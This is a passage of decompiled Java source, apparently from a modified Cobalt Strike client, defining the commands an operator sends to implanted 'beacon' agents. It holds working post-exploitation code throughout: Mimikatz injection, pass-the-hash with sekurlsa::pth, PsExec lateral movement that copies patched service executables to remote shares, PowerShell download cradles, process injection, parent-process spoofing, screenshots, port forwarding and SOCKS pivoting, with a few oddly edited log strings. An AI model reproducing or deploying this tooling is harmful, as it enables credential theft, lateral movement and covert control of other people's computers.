						(new MimikatzJobSmall(this, var1)).inject(var8, var2, var3);

					}
					else {

						error(var8, "Do not inject into a " + var3 + " process when running on a " + var10 + " system.");

					}

				}
				else if (this.cobaltstrike.getInjectSelf().booleanValue()) {
					int PID = CommonUtils.toNumber(var9.getPid(), 0);


					log_task(var8, "Tasked beacon to run Mimikatz inject pid:" + PID, "T1018");

					(new MimikatzJobSmall(this, var1)).inject(var8, PID, var9.arch());

				}
				else {

					(new MimikatzJobSmall(this, var1)).spawn(var8, var10);

				}

			}

		}

	}


	public void MkDir(String var1) {
		taskOneEncodedArg(54, var1, "Tasked beacon to make directory " + var1, "");

	}


	protected void mode(String var1, String var2) {
		for (int var3 = 0; var3 < this.bids.length; var3++) {
			this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.Mode(this.bids[var3], var2)));

			this.conn.call("beacons.mode", CommonUtils.args(this.bids[var3], var1));

		}

	}


	public void ModeDNS() {
		mode("dns", "data channel set to DNS");

	}


	public void ModeDNS6() {
		mode("dns6", "data channel set to DNS6");

	}


	public void ModeDNS_TXT() {
		mode("dns-txt", "data channel set to DNS-TXT");

	}


	public void ModeHTTP() {
		mode("http", "data channel set to HTTP");

	}


	public void Move(String var1, String var2) {
		for (int var3 = 0; var3 < this.bids.length; var3++) {
			this.builder.setCommand(74);

			this.builder.addLengthAndEncodedString(this.bids[var3], var1);

			this.builder.addLengthAndEncodedString(this.bids[var3], var2);

			byte[] var4 = this.builder.build();

			log_task(this.bids[var3], "Tasked beacon to move " + var1 + " to " + var2, file_to_tactic(var2));

			this.conn.call("beacons.task", CommonUtils.args(this.bids[var3], var4));

		}

	}


	public void NetView(String var1, String var2, String var3, int var4, String var5) {
		if ("domain".equals(var1)) {
			String[] var6 = this.bids;

			int var7 = var6.length;


			for (int var8 = 0; var8 < var7; var8++) {
				String var9 = var6[var8];

				log_task(var9, "Tasked beacon to run net domain", "T1018");

				(new NetDomain(this.client)).go(var9);

			}

		}
		else if (var4 >= 0 && CommonUtils.contains("x86, x64", var5)) {
			_NetView(var1, var2, var3, var4, var5);

		}
		else {

			_NetView(var1, var2, var3);

		}

	}


	public void _NetView(String var1, String var2, String var3) {
		String[] var4 = this.bids;

		int var5 = var4.length;


		for (int var6 = 0; var6 < var5; var6++) {
			String var7 = var4[var6];

			BeaconEntry var8 = DataUtils.getBeacon(this.data, var7);

			if (var8 != null) {
				(new NetViewJob(this, var1, var2, var3)).spawn(var7, var8.arch());

			}

		}

	}


	public void _NetView(String var1, String var2, String var3, int var4, String var5) {
		String[] var6 = this.bids;

		int var7 = var6.length;


		for (int var8 = 0; var8 < var7; var8++) {
			String var9 = var6[var8];

			(new NetViewJob(this, var1, var2, var3)).inject(var9, var4, var5);

		}

	}


	public void Note(String var1) {
		for (int var2 = 0; var2 < this.bids.length; var2++) {
			this.conn.call("beacons.note", CommonUtils.args(this.bids[var2], var1));

			this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.Note(this.bids[var2], var1)));

		}

	}


	public void Hook(String var1) {
		for (int var2 = 0; var2 < this.bids.length; var2++) {
			this.conn.call("beacons.hook", CommonUtils.args(this.bids[var2], var1));

		}

	}


	public void OneLiner(String var1, String var2) {
		ScListener var3 = ListenerUtils.getListener(this.client, var1);


		for (int var4 = 0; var4 < this.bids.length; var4++) {
			String var5 = SetupPayloadDownloadCradle(this.bids[var4], var2, var3);

			DialogUtils.addToClipboardQuiet(var5);

			log_task(this.bids[var4], "Setup " + var5 + " to run " + var3 + " (" + var2 + ")", "T1086");

		}

	}


	public void PassTheHash(String var1, String var2, String var3, int var4, String var5) {
		String var6 = "\\\\.\\pipe\\" + CommonUtils.garbage("system");

		String var7 = CommonUtils.garbage("random data");

		String var8 = "%COMSPEC% /c echo " + var7 + " > " + var6;

		this.builder.setCommand(60);

		this.builder.addString(var6);

		byte[] var9 = this.builder.build();


		for (int var10 = 0; var10 < this.bids.length; var10++) {
			this.conn.call("beacons.task", CommonUtils.args(this.bids[var10], var9));

		}


		MimikatzSmall("sekurlsa::pth /user:" + var2 + " /domain:" + var1 + " /ntlm:" + var3 + " /run:\"" + var8 + "\"", var4, var5);

		this.builder.setCommand(61);

		byte[] var12 = this.builder.build();


		for (int var11 = 0; var11 < this.bids.length; var11++) {
			this.conn.call("beacons.task", CommonUtils.args(this.bids[var11], var12));

		}

	}


	public void Pause(int var1) {
		this.builder.setCommand(47);

		this.builder.addInteger(var1);

		byte[] var2 = this.builder.build();


		for (int var3 = 0; var3 < this.bids.length; var3++) {
			this.conn.call("beacons.task", CommonUtils.args(this.bids[var3], var2));

		}

	}


	public void PivotListenerTCP(int var1) {
		this.builder.setCommand(82);

		this.builder.addShort(var1);

		byte[] var2 = this.builder.build();


		for (int var3 = 0; var3 < this.bids.length; var3++) {
			log_task(this.bids[var3], "Tasked " + CommonUtils.session(this.bids[var3]) + " to accept TCP Beacon sessions on port " + var1, "T1090");

			this.conn.call("beacons.task", CommonUtils.args(this.bids[var3], var2));

		}

	}


	public void PortScan(String var1, String var2, String var3, int var4, int var5, String var6) {
		boolean var7 = (var5 >= 0 && CommonUtils.contains("x86, x64", var6));

		String[] var8 = this.bids;

		int var9 = var8.length;


		for (int var10 = 0; var10 < var9; var10++) {
			String var11 = var8[var10];

			if (var7) {
				(new PortScannerJob(this, var1, var2, var3, var4)).inject(var11, var5, var6);

			}
			else {

				BeaconEntry var12 = DataUtils.getBeacon(this.data, var11);

				if (var12 != null) {
					if (this.cobaltstrike.getInjectSelf().booleanValue()) {
						int PID = CommonUtils.toNumber(var12.getPid(), 0);

						log_task(var11, "Tasked beacon to PortScan inject " + PID + " :cat edit.", "T1106");

						(new PortScannerJob(this, var1, var2, var3, var4)).inject(var11, PID, var12.arch());

					}
					else {

						(new PortScannerJob(this, var1, var2, var3, var4)).spawn(var11, var12.arch());

					}

				}

			}

		}

	}


	public void PortForward(int var1, String var2, int var3) {
		this.builder.setCommand(50);

		this.builder.addShort(var1);

		byte[] var4 = this.builder.build();


		for (int var5 = 0; var5 < this.bids.length; var5++) {
			this.conn.call("beacons.rportfwd", CommonUtils.args(this.bids[var5], Integer.valueOf(var1), var2, Integer.valueOf(var3)));

			log_task(this.bids[var5], "Tasked " + CommonUtils.session(this.bids[var5]) + " to forward port " + var1 + " to " + var2 + ":" + var3, "T1090");

			this.conn.call("beacons.task", CommonUtils.args(this.bids[var5], var4));

		}

	}


	public void PortForwardLocal(int var1, String var2, int var3) {
		this.client.getTunnelManager().allow(var2, var3);

		this.builder.setCommand(50);

		this.builder.addShort(var1);

		byte[] var4 = this.builder.build();


		for (int var5 = 0; var5 < this.bids.length; var5++) {
			this.conn.call("beacons.rportfwd_local", CommonUtils.args(this.bids[var5], Integer.valueOf(var1), var2, Integer.valueOf(var3)));

			log_task(this.bids[var5], "Tasked " + CommonUtils.session(this.bids[var5]) + " to forward port " + var1 + " to " + DataUtils.getNick(this.client.getData()) + " -> " + var2 + ":" + var3, "T1090");

			this.conn.call("beacons.task", CommonUtils.args(this.bids[var5], var4));

		}

	}


	public void PortForwardStop(int var1) {
		this.builder.setCommand(51);

		this.builder.addShort(var1);

		byte[] var2 = this.builder.build();


		for (int var3 = 0; var3 < this.bids.length; var3++) {
			log_task(this.bids[var3], "Tasked " + CommonUtils.session(this.bids[var3]) + " to stop port forward on " + var1);

			this.conn.call("beacons.task", CommonUtils.args(this.bids[var3], var2));

			this.client.getConnection().call("beacons.pivot_stop_port", CommonUtils.args(this.bids[var3], "" + var1));

		}

	}


	public void PowerShell(String var1) {
		for (int var2 = 0; var2 < this.bids.length; var2++) {
			_PowerShell(this.bids[var2], var1);

		}

	}


	public void _PowerShell(String var1, String var2) {
		PowerShellTasks var3 = new PowerShellTasks(this.client, var1);

		log_task(var1, "Tasked beacon to run: " + var2, "T1086");

		String var4 = var3.getImportCradle();

		var3.runCommand(var4 + var4);

	}


	public void PowerShellWithCradle(String var1, String var2) {
		for (int var3 = 0; var3 < this.bids.length; var3++) {
			_PowerShellWithCradle(this.bids[var3], var1, var2);

		}

	}


	public void _PowerShellWithCradle(String var1, String var2, String var3) {
		PowerShellTasks var4 = new PowerShellTasks(this.client, var1);

		log_task(var1, "Tasked beacon to run: " + var2, "T1086");

		var4.runCommand(var3 + var3);

	}


	public void PowerShellNoImport(String var1) {
		for (int var2 = 0; var2 < this.bids.length; var2++) {
			PowerShellTasks var3 = new PowerShellTasks(this.client, this.bids[var2]);

			var3.runCommand(var1);

		}

	}


	public void PowerShellUnmanaged(String var1) {
		for (int var2 = 0; var2 < this.bids.length; var2++) {
			BeaconEntry var3 = DataUtils.getBeacon(this.data, this.bids[var2]);

			String var4 = (new PowerShellTasks(this.client, this.bids[var2])).getImportCradle();

			if (this.cobaltstrike.getInjectSelf().booleanValue()) {
				int PID = CommonUtils.toNumber(var3.getPid(), 0);

				log_task(var4, "Tasked beacon to PowerShellUnmanaged inject " + PID + " :cat edit.", "T1106");

				(new PowerShellJob(this, var4, var1)).inject(this.bids[var2], PID, var3.arch());

			}
			else {

				(new PowerShellJob(this, var4, var1)).spawn(this.bids[var2], var3.arch());

			}

		}

	}


	public void PowerShellUnmanaged(String var1, String var2) {
		for (int var3 = 0; var3 < this.bids.length; var3++) {
			BeaconEntry var4 = DataUtils.getBeacon(this.data, this.bids[var3]);

			if (var4.is64()) {
				(new PowerShellJob(this, var2, var1)).spawn(this.bids[var3], "x64");

			}
			else {

				(new PowerShellJob(this, var2, var1)).spawn(this.bids[var3], "x86");

			}

		}

	}


	public void RemoteExecute(String var1, String var2, String var3) {
		BeaconRemoteExecMethods.RemoteExecMethod var4 = DataUtils.getBeaconRemoteExecMethods(this.data)
				.getRemoteExecMethod(var1);


		for (int var5 = 0; var5 < this.bids.length; var5++) {
			var4.remoteexec(this.bids[var5], var2, var3);

		}

	}


	public void SecureShell(String var1, String var2, String var3, int var4, int var5, String var6) {
		boolean var7 = (var5 >= 0 && CommonUtils.contains("x86, x64", var6));

		String[] var8 = this.bids;

		int var9 = var8.length;


		for (int var10 = 0; var10 < var9; var10++) {
			String var11 = var8[var10];

			BeaconEntry var12 = DataUtils.getBeacon(this.data, var11);

			if (var12 != null) {
				ScListener var13 = ListenerUtils.getListener(this.client, var12.getListenerName());

				if (var7) {
					(new SSHAgentJob(this, var13, var3, var4, var1, var2, false)).inject(var11, var5, var6);

				}
				else {

					(new SSHAgentJob(this, var13, var3, var4, var1, var2, false)).spawn(var11, var12.arch());

				}

			}

		}

	}


	public void SecureShellPubKey(String var1, byte[] var2, String var3, int var4, int var5, String var6) {
		boolean var7 = (var5 >= 0 && CommonUtils.contains("x86, x64", var6));

		String[] var8 = this.bids;

		int var9 = var8.length;


		for (int var10 = 0; var10 < var9; var10++) {
			String var11 = var8[var10];

			BeaconEntry var12 = DataUtils.getBeacon(this.data, var11);

			if (var12 != null) {
				ScListener var13 = ListenerUtils.getListener(this.client, var12.getListenerName());

				if (var7) {
					(new SSHAgentJob(this, var13, var3, var4, var1, CommonUtils.bString(var2), true)).inject(var11, var5, var6);

				}
				else {

					(new SSHAgentJob(this, var13, var3, var4, var1, CommonUtils.bString(var2), true)).spawn(var11, var12.arch());

				}

			}

		}

	}


	protected List _extractFunctions(String var1) {
		LinkedList<String> var2 = new LinkedList();

		if (A == null) {
			try {

				A = Pattern.compile("\\s*[fF]unction ([a-zA-Z0-9-]*).*?", 0);

			}
			catch (Exception var7) {
				MudgeSanity.logException("compile pattern to extract posh funcs", var7, false);

			}

		}


		String[] var3 = var1.split("\n");


		for (int var4 = 0; var4 < var3.length; var4++) {
			String var5 = var3[var4].trim();

			Matcher var6 = A.matcher(var5);

			if (var6.matches()) {
				var2.add(var6.group(1));

			}

		}


		return var2;

	}


	public void PowerShellImportClear() {
		LinkedList var1 = new LinkedList();

		String var2 = "";


		for (int var3 = 0; var3 < this.bids.length; var3++) {
			DataUtils.reportPowerShellImport(this.client.getData(), this.bids[var3], var1);

			this.conn.call("beacons.report_posh", CommonUtils.args(this.bids[var3], var1));

			taskOneArg(37, var2, "Tasked beacon to clear imported PowerShell script", "T1086, T1064");

		}

	}


	public void PowerShellImport(String var1) {
		try {

			Object var4;

			String var5;

			FileInputStream var2 = new FileInputStream(var1);

			byte[] var3 = CommonUtils.readAll(var2);

			var2.close();


			if (var3.length == 0) {
				var4 = new LinkedList();

				var5 = "";

			}
			else {

				var4 = _extractFunctions(CommonUtils.bString(var3));

				((List<String>) var4).add("");

				var5 = (new PowerShellUtils(this.client)).PowerShellCompress(var3);

			}


			if (var5.length() > Tasks.max()) {
				error("max powershell import size is 1MB. Compressed script is: " + var5.length() + " bytes");


				return;

			}

			for (int var6 = 0; var6 < this.bids.length; var6++) {
				DataUtils.reportPowerShellImport(this.client.getData(), this.bids[var6], (List) var4);

				this.conn.call("beacons.report_posh", CommonUtils.args(this.bids[var6], var4));

			}


			taskOneArg(37, var5, "Tasked beacon to import: " + var1, "T1086, T1064");

		}
		catch (IOException var7) {
			MudgeSanity.logException("PowerShellImport: " + var1, var7, false);

		}

	}


	public void PPID(int var1) {
		if (var1 == 0) {
			taskOneArgI(75, var1, "Tasked beacon to use itself as parent process", "T1059, T1093, T1106");

		}
		else {

			taskOneArgI(75, var1, "Tasked beacon to spoof " + var1 + " as parent process", "T1059, T1093, T1106");

		}

	}


	public void Printscreen(int var1, String var2) {
		String[] var3 = this.bids;

		int var4 = var3.length;


		for (int var5 = 0; var5 < var4; var5++) {
			String var6 = var3[var5];

			ScreenshotJob.Printscreen(this).inject(var6, var1, var2);

		}

	}


	public void Printscreen() {
		String[] var1 = this.bids;

		int var2 = var1.length;


		for (int var3 = 0; var3 < var2; var3++) {
			String var4 = var1[var3];

			BeaconEntry var5 = DataUtils.getBeacon(this.data, var4);

			if (var5 != null) {
				if (this.cobaltstrike.getInjectSelf().booleanValue()) {
					int PID = CommonUtils.toNumber(var5.getPid(), 0);

					log_task(var4, "Tasked beacon to Printscreen inject " + PID + " :fuck edit.", "T1106");

					ScreenshotJob.Printscreen(this).inject(var4, PID, var5.arch());

				}
				else {

					ScreenshotJob.Printscreen(this).spawn(var4, var5.arch());

				}

			}

		}

	}


	public void Ps() {
		taskNoArgsCallback(32, "Tasked beacon to list processes", "T1057");

	}


	public void PsExec(String var1, String var2, String var3, String var4) {
		ScListener var5 = ListenerUtils.getListener(this.client, var2);


		for (int var6 = 0; var6 < this.bids.length; var6++) {
			PsExec(this.bids[var6], var1, var4, var5, var3);

		}


		linkToPayloadRemote(var5, var1);

	}


	public void PsExec(String var1, String var2, String var3) {
		PsExec(var1, var2, var3, "x86");

	}


	public void PsExec(String var1, String var2, String var3, ScListener var4, String var5) {
		String var6 = getPsExecService();

		String var7 = "PsExec";

		DevLog.log(DevLog.STORY.CS0215_TEST_EXPORT, getClass(), var7, "002");

		byte[] var8 = var4.export(this.client, var3);

		byte[] var9 = (new ArtifactUtils(this.client)).patchArtifact(var8, "x86".equals(var3) ? "artifact32svcbig.exe" : "artifact64svcbig.exe");

		String var10 = var6 + ".exe";

		String var11 = "\\\\" + var2 + "\\" + var5 + "\\" + var10;

		String var12 = "\\\\" + var2 + "\\" + var5 + "\\" + var10;

		if (".".equals(var2)) {
			var11 = "\\\\127.0.0.1\\" + var5 + "\\" + var10;

			var12 = "\\\\127.0.0.1\\" + var5 + "\\" + var10;

		}


		this.builder.setCommand(10);

		this.builder.addLengthAndEncodedString(var1, var12);

		this.builder.addString(CommonUtils.bString(var9));

		byte[] var13 = this.builder.build();

		PsExecCommand var14 = new PsExecCommand(this.client, var2, var6, var11);

		this.builder.setCommand(56);

		this.builder.addEncodedString(var1, var12);

		byte[] var15 = this.builder.build();

		if (".".equals(var2)) {
			log_task(var1, "Tasked beacon to run " + var4 + " via Service Control Manager (" + var12 + ")", "T1035, T1050");

		}
		else if (var5.endsWith("$")) {
			log_task(var1, "Tasked beacon to run " + var4 + " on " + var2 + " via Service Control Manager (" + var12 + ")", "T1035, T1050, T1077");

		}
		else {

			log_task(var1, "Tasked beacon to run " + var4 + " on " + var2 + " via Service Control Manager (" + var12 + ")", "T1035, T1050");

		}


		this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.ServiceIndicator(var1, var2, var6)));

		this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.FileIndicator(var1, var12, var9)));

		this.conn.call("beacons.task", CommonUtils.args(var1, var13));

		var14.go(var1);

		this.conn.call("beacons.task", CommonUtils.args(var1, var15));

	}


	public void PsExecPSH(String var1, String var2) {
		ScListener var3 = ListenerUtils.getListener(this.client, var2);


		for (int var4 = 0; var4 < this.bids.length; var4++) {
			PsExecPSH(this.bids[var4], var1, var3);

		}


		linkToPayloadRemote(var3, var1);

	}


	public void PsExecPSH(String var1, String var2, ScListener var3) {
		String var4 = var3.getConfig().getStagerPipe();

		byte[] var5 = var3.getPayloadStagerPipe(var4, "x86");

		String var6 = getPsExecService();

		PsExecCommand var7 = new PsExecCommand(this.client, var2, var6, cmd_sanity("%COMSPEC% /b /c start /b /min " + CommonUtils.bString((new PowerShellUtils(this.client)).buildPowerShellCommand(var5)), "psexec_psh"));

		log_task(var1, "Tasked beacon to run " + var3 + " on " + var2 + " via Service Control Manager (PSH)", "T1035, T1050");

		this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.ServiceIndicator(var1, var2, var6)));

		var7.go(var1);

		StagePipe(var1, var2, var4, "x86", var3);

	}


	public void PsExecCommand(String var1, String var2) {
		String var3 = getPsExecService();


		for (int var4 = 0; var4 < this.bids.length; var4++) {
			PsExecCommand(this.bids[var4], var1, var3, var2);

		}

	}


	public void PsExecCommand(String var1, String var2, String var3) {
		for (int var4 = 0; var4 < this.bids.length; var4++) {
			PsExecCommand(this.bids[var4], var1, var2, var3);

		}

	}


	public void PsExecCommand(String var1, String var2, String var3, String var4) {
		PsExecCommand var5 = new PsExecCommand(this.client, var2, var3, var4);

		log_task(var1, "Tasked beacon to run '" + var4 + "' on " + var2 + " via Service Control Manager", "T1035, T1050");

		this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.ServiceIndicator(var1, var2, var3)));

		var5.go(var1);

	}


	public void PsInject(int var1, String var2, String var3) {
		String[] var4 = this.bids;

		int var5 = var4.length;


		for (int var6 = 0; var6 < var5; var6++) {
			String var7 = var4[var6];

			String var8 = (new PowerShellTasks(this.client, var7)).getImportCradle();

			(new PowerShellJob(this, var8, var3)).inject(var7, var1, var2);

		}

	}


	public void Pwd() {
		taskNoArgs(39, "Tasked beacon to print working directory");
	}

	public void DeleteSelf() {
		taskNoArgs(201, "Tasked beacon to delete self");

	}


	public void RegQuery(Registry var1) {
		for (int var2 = 0; var2 < this.bids.length; var2++) {
			RegQuery(this.bids[var2], var1);

		}

	}


	public void RegQuery(String var1, Registry var2) {
		log_task(var1, "Tasked beacon to query " + var2.toString(), "T1012");

		(new RegistryQuery(this.client, var2)).go(var1);

	}


	public void RegQueryValue(Registry var1) {
		for (int var2 = 0; var2 < this.bids.length; var2++) {
			RegQueryValue(this.bids[var2], var1);

		}

	}


	public void RegQueryValue(String var1, Registry var2) {
		log_task(var1, "Tasked beacon to query " + var2.toString(), "T1012");

		(new RegistryQuery(this.client, var2)).go(var1);

	}


	public void Rev2Self() {
		taskNoArgs(28, "Tasked beacon to revert token", "T1134");

	}


	public void Rm(String var1) {
		for (int var2 = 0; var2 < this.bids.length; var2++) {
			Rm(this.bids[var2], var1);

		}

	}


	public void Rm(String var1, String var2) {
		byte[] var3 = DataUtils.encodeForBeacon(this.client.getData(), var1, var2);

		if (var3.length == 0) {
			error(var1, "Rejected empty argument for rm. Use . to remove current folder");

		}
		else {

			String var4 = DataUtils.decodeForBeacon(this.client.getData(), var1, var3);

			if (!var4.equals(var2)) {
				error(var1, "'" + var2 + "' did not decode in a sane way. Specify '" + var4 + "' explicity.");

			}
			else {

				this.builder.setCommand(56);

				this.builder.addString(var3);

				byte[] var5 = this.builder.build();

				log_task(var1, "Tasked beacon to remove " + var2, "T1107, " + file_to_tactic(var2));

				this.conn.call("beacons.task", CommonUtils.args(var1, var5));

			}

		}

	}


	public void Run(String var1) {
		for (int var2 = 0; var2 < this.bids.length; var2++) {
			this.builder.setCommand(78);

			this.builder.addLengthAndString("");

			this.builder.addLengthAndEncodedString(this.bids[var2], var1);

			this.builder.addShort(0);

			byte[] var3 = this.builder.build();

			log_task(this.bids[var2], "Tasked beacon to run: " + var1, "T1059");

			this.conn.call("beacons.task", CommonUtils.args(this.bids[var2], var3));

		}

	}


	public void RunAs(String var1, String var2, String var3, String var4) {
		for (int var5 = 0; var5 < this.bids.length; var5++) {
			this.builder.setCommand(38);

			this.builder.addLengthAndEncodedString(this.bids[var5], var1);

			this.builder.addLengthAndEncodedString(this.bids[var5], var2);

			this.builder.addLengthAndEncodedString(this.bids[var5], var3);

			this.builder.addLengthAndEncodedString(this.bids[var5], var4);

			byte[] var6 = this.builder.build();

			log_task(this.bids[var5], "Tasked beacon to execute: " + var4 + " as " + var1 + "\\" + var2, "T1078, T1106");

			this.conn.call("beacons.task", CommonUtils.args(this.bids[var5], var6));

		}

	}


	public void RunUnder(int var1, String var2) {
		for (int var3 = 0; var3 < this.bids.length; var3++) {
			this.builder.setCommand(76);

			this.builder.addInteger(var1);

			this.builder.addLengthAndEncodedString(this.bids[var3], var2);

			byte[] var4 = this.builder.build();

			log_task(this.bids[var3], "Tasked beacon to execute: " + var2 + " as a child of " + var1, "T1106");

			this.conn.call("beacons.task", CommonUtils.args(this.bids[var3], var4));

		}

	}


	public void Screenshot(int var1, String var2) {
		String[] var3 = this.bids;

		int var4 = var3.length;


		for (int var5 = 0; var5 < var4; var5++) {
			String var6 = var3[var5];

			ScreenshotJob.Screenshot(this).inject(var6, var1, var2);

		}

	}


	public void Screenshot() {
		String[] var1 = this.bids;

		int var2 = var1.length;


		for (int var3 = 0; var3 < var2; var3++) {
			String var4 = var1[var3];

			BeaconEntry var5 = DataUtils.getBeacon(this.data, var4);

			if (var5 != null) {
				if (this.cobaltstrike.getInjectSelf().booleanValue()) {
					int PID = CommonUtils.toNumber(var5.getPid(), 0);

					log_task(var4, "Tasked beacon to Screenshot inject " + PID + " :cat edit.", "T1106");

					ScreenshotJob.Screenshot(this).inject(var4, PID, var5.arch());

				}
				else {

					ScreenshotJob.Screenshot(this).spawn(var4, var5.arch());

				}

			}

		}

	}


	public void Screenwatch(int var1, String var2) {
		String[] var3 = this.bids;

		int var4 = var3.length;


		for (int var5 = 0; var5 < var4; var5++) {
			String var6 = var3[var5];

			ScreenshotJob.Screenwatch(this).inject(var6, var1, var2);

		}

	}


	public void Screenwatch() {
		String[] var1 = this.bids;

		int var2 = var1.length;


		for (int var3 = 0; var3 < var2; var3++) {
			String var4 = var1[var3];

			BeaconEntry var5 = DataUtils.getBeacon(this.data, var4);

			if (var5 != null) {
				if (this.cobaltstrike.getInjectSelf().booleanValue()) {
					int PID = CommonUtils.toNumber(var5.getPid(), 0);

					log_task(var4, "Tasked beacon to Screenshot inject " + PID + " :cat edit.", "T1106");

					ScreenshotJob.Screenwatch(this).inject(var4, PID, var5.arch());

				}
				else {

					ScreenshotJob.Screenwatch(this).spawn(var4, var5.arch());

				}

			}

		}

	}


	public void Shell(String var1) {
		for (int var2 = 0; var2 < this.bids.length; var2++) {
			Shell(this.bids[var2], CommonUtils.session(this.bids[var2]), var1);

		}

	}


	public void Shell(String var1, String var2, String var3) {
		if (var2.equals("session")) {
			this.builder.setCommand(2);

			this.builder.addEncodedString(var1, var3);

		}
		else {

			if (!var2.equals("beacon")) {
				CommonUtils.print_error("Unknown session type '" + var2 + "' for " + var1 + ". Didn't run '" + var3 + "'");


				return;

			}

			this.builder.setCommand(78);

			this.builder.addLengthAndString("%COMSPEC%");

			this.builder.addLengthAndEncodedString(var1, " /C " + var3);

			this.builder.addShort(0);

		}


		byte[] var4 = this.builder.build();

		log_task(var1, "Tasked " + var2 + " to run: " + var3, "T1059");

		this.conn.call("beacons.task", CommonUtils.args(var1, var4));

	}


	public void ShellSudo(String var1, String var2) {
		taskOneArg(2, "echo \"" + var1 + "\" | sudo -S " + var2, "Tasked session to run: " + var2 + " (sudo)", "T1169");

	}


	public void Sleep(int var1, int var2) {
		this.builder.setCommand(4);

		if (var1 == 0) {
			this.builder.addInteger(100);

			this.builder.addInteger(90);

		}
		else {

			this.builder.addInteger(var1 * 1000);

			this.builder.addInteger(var2);

		}


		byte[] var3 = this.builder.build();


		for (int var4 = 0; var4 < this.bids.length; var4++) {
			BeaconEntry var5 = DataUtils.getEgressBeacon(this.data, this.bids[var4]);

			BeaconEntry var6 = DataUtils.getBeacon(this.data, this.bids[var4]);

			if (var5 != null && var6 != null && !var5.getId().equals(this.bids[var4])) {
				if (var1 == 0) {
					log_task(this.bids[var4], "Tasked " + CommonUtils.session(this.bids[var4]) + " to become interactive [change made to: " + var5.title() + "]");

					this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.Input(var5.getId(), "sleep 0 [from: " + var6.title() + "]")));

					log_task(var5.getId(), "Tasked beacon to become interactive", "T1029");

				}
				else if (var2 == 0) {
					log_task(this.bids[var4], "Tasked " + CommonUtils.session(this.bids[var4]) + " to sleep for " + var1 + "s [change made to: " + var5.title() + "]");

					this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.Input(var5.getId(), "sleep " + var1 + "s [from: " + var6.title() + "]")));

					log_task(var5.getId(), "Tasked beacon to sleep for " + var1 + "s", "T1029");

				}
				else {

					log_task(this.bids[var4], "Tasked " + CommonUtils.session(this.bids[var4]) + " to sleep for " + var1 + "s (" + var2 + "% jitter) [change made to: " + var5.title() + "]");

					this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.Input(var5.getId(), "sleep " + var1 + " " + var2 + " [from: " + var6.title() + "]")));

					log_task(var5.getId(), "Tasked beacon to sleep for " + var1 + "s (" + var2 + "% jitter)", "T1029");

				}


				this.conn.call("beacons.task", CommonUtils.args(var5.getId(), var3));

			}
			else {

				if (var1 == 0) {
					log_task(this.bids[var4], "Tasked beacon to become interactive", "T1029");

				}
				else if (var2 == 0) {
					log_task(this.bids[var4], "Tasked beacon to sleep for " + var1 + "s", "T1029");

				}
				else {

					log_task(this.bids[var4], "Tasked beacon to sleep for " + var1 + "s (" + var2 + "% jitter)", "T1029");

				}


				this.conn.call("beacons.task", CommonUtils.args(this.bids[var4], var3));

			}

		}

	}


	public void GoInteractive(String var1) {
		BeaconEntry var2 = DataUtils.getEgressBeacon(this.data, var1);

		this.builder.setCommand(4);

		this.builder.addInteger(100);

		this.builder.addInteger(90);

		byte[] var3 = this.builder.build();

		if (var2 != null) {
			this.conn.call("beacons.task", CommonUtils.args(var2.getId(), var3));

		}

	}


	public void SetEnv(String var1, String var2) {
		StringBuffer var3 = new StringBuffer();

		var3.append(var1);

		var3.append("=");

		if (var2 != null && var2.length() > 0) {
			var3.append(var2);

			var3.append(false);

			taskOneEncodedArg(72, var3.toString(), "Tasked beacon to set " + var1 + " to " + var2, "");

		}
		else {

			var3.append(false);

			taskOneEncodedArg(72, var3.toString(), "Tasked beacon to unset " + var1, "");

		}

	}


	public void SocksStart(int var1) {
		for (int var2 = 0; var2 < this.bids.length; var2++) {
			GoInteractive(this.bids[var2]);

			this.conn.call("beacons.pivot", CommonUtils.args(this.bids[var2], new Integer(var1)));

		}

	}


	public void SocksStop() {
		for (int var1 = 0; var1 < this.bids.length; var1++) {
			this.conn.call("beacons.pivot_stop", CommonUtils.args(this.bids[var1]));

		}

	}


	public void Spawn(String var1, ScListener var2, String var3) {
		boolean var4 = false;

		if ("x86".equals(var3)) {
			this.builder.setCommand(1);

		}
		else if ("x64".equals(var3)) {
			this.builder.setCommand(44);

		}


		String var5 = "Spawn";

		DevLog.log(DevLog.STORY.CS0215_TEST_EXPORTLOCAL, getClass(), var5, "003");

		this.builder.addString(var2.exportLocal(this.client, var1, var3));

		byte[] var6 = this.builder.build();

		log_task(var1, "Tasked beacon to spawn (" + var3 + ") " + var2.toString(), "T1093");

		this.conn.call("beacons.task", CommonUtils.args(var1, var6));

	}


	public void Spawn(String var1) {
		ScListener var2 = ListenerUtils.getListener(this.client, var1);


		for (int var3 = 0; var3 < this.bids.length; var3++) {
			if (var2.isForeign()) {
				Spawn(this.bids[var3], var2, "x86");

			}
			else {

				Spawn(this.bids[var3], var2, arch(this.bids[var3]));

			}

		}


		linkToPayloadLocal(var2);

	}


	public void Spawn(String var1, String var2) {
		ScListener var3 = ListenerUtils.getListener(this.client, var1);


		for (int var4 = 0; var4 < this.bids.length; var4++) {
			Spawn(this.bids[var4], var3, var2);

		}


		linkToPayloadLocal(var3);

	}


	public void SpawnAndTunnel(String var1, String var2, int var3, String var4, boolean var5) {
		for (int var6 = 0; var6 < this.bids.length; var6++) {
			SpawnAndTunnel(this.bids[var6], var1, var2, var3, var4, var5);

		}

	}


	public void SpawnAndTunnel(String var1, String var2, String var3, int var4, String var5, boolean var6) {
		if (var6) {
			this.client.getTunnelManager().allow(var3, var4);

		}


		if (var6) {
			log_task(var1, "Tasked " + CommonUtils.session(var1) + " to spawn " + CommonUtils.getFileName(var5) + " (" + var2 + ") and forward 127.0.0.1:" + var4 + " to " + DataUtils.getNick(this.client.getData()) + " -> " + var3 + ":" + var4, "T1090");

		}
		else {

			log_task(var1, "Tasked " + CommonUtils.session(var1) + " to spawn " + CommonUtils.getFileName(var5) + " (" + var2 + ") and forward 127.0.0.1:" + var4 + " to " + var3 + ":" + var4, "T1090");

		}


		if (var6) {
			this.conn.call("beacons.rportfwd_local", CommonUtils.args(var1, Integer.valueOf(var4), var3, Integer.valueOf(var4)));

		}
		else {

